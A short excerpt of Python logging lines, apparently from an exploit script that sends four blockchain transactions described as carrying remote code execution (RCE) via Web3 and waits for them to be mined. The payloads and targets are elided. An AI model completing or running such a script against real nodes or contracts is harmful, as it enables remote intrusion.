...
logger.info("Transaction with RCE sent, Hash is: " + Web3.toHex(exploit1))
...
logger.info("Transaction with RCE sent, Hash is: " + Web3.toHex(exploit2))
logger.info("Waiting for transaction to be mined...")
...
logger.info("Transaction with RCE sent, Hash is: " + Web3.toHex(exploit3))
logger.info("Waiting for transaction to be mined...")
...
logger.info("Transaction with RCE sent, Hash is: " + Web3.toHex(exploit4))
logger.info("Waiting for transaction to be mined...")
